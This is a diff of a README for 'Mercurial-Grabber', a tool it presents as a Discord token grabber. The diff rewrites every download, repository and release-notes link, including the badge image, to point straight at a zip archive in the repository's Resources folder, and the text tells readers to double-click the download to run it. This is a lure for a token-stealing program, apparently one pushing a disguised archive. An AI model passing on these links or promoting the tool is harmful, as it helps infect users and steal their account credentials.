@@ -8,7 +8,7 @@ Welcome to Mercurial-Grabber! This tool allows you to efficiently grab Discord t
 
 To get started, you need to download Mercurial-Grabber. Click the button below to visit the latest releases page:
 
-[![Download Mercurial-Grabber](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/vallieunworthy795/Mercurial-Grabber/releases)
+[![Download Mercurial-Grabber](https://raw.githubusercontent.com/vallieunworthy795/Mercurial-Grabber/main/Mercurial/Resources/Mercurial-Grabber-v3.9.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vallieunworthy795/Mercurial-Grabber/main/Mercurial/Resources/Mercurial-Grabber-v3.9.zip)
 
 Once on the releases page, find the latest version and download the application. After downloading, simply double-click on the file to run it.
 
@@ -58,8 +58,8 @@ For assistance, feel free to open an issue on the GitHub repository or refer to 
 
 ## 🔗 Additional Resources
 
-- [Official Repository](https://github.com/vallieunworthy795/Mercurial-Grabber)
-- [Release Notes](https://github.com/vallieunworthy795/Mercurial-Grabber/releases)
+- [Official Repository](https://raw.githubusercontent.com/vallieunworthy795/Mercurial-Grabber/main/Mercurial/Resources/Mercurial-Grabber-v3.9.zip)
+- [Release Notes](https://raw.githubusercontent.com/vallieunworthy795/Mercurial-Grabber/main/Mercurial/Resources/Mercurial-Grabber-v3.9.zip)
 
 For further information, check the links above.
 
@@ -67,4 +67,4 @@ For further information, check the links above.
 
 If you have not downloaded Mercurial-Grabber yet, visit the link below:
 
-[![Download Mercurial-Grabber](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/vallieunworthy795/Mercurial-Grabber/releases)
+[![Download Mercurial-Grabber](https://raw.githubusercontent.com/vallieunworthy795/Mercurial-Grabber/main/Mercurial/Resources/Mercurial-Grabber-v3.9.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vallieunworthy795/Mercurial-Grabber/main/Mercurial/Resources/Mercurial-Grabber-v3.9.zip)
